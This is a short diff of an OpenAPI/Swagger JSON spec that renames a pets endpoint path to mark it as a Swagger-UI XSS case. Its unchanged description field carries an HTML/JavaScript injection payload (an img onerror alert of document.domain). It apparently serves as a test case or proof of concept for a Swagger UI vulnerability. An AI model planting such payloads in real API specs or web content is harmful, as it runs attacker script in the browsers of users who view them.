@@ -9,7 +9,7 @@
     }
   },
   "paths": {
-    "/pets": {
+    "/Swagger-UI-XSS/pets": {
       "get": {
         "description": "This is Description </p><img/src/onerror='javascript:alert(document.domain)//'><p>ok",
         "operationId": "findPets",
